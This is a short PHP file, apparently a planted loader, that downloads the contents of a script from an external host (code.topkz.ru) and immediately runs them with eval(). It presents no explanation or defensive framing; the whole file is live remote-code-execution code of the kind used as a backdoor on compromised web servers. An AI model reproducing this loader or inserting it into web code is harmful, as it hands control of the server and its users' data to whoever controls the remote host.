<?php
$path = "https://code.topkz.ru/fgd/8/s1.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
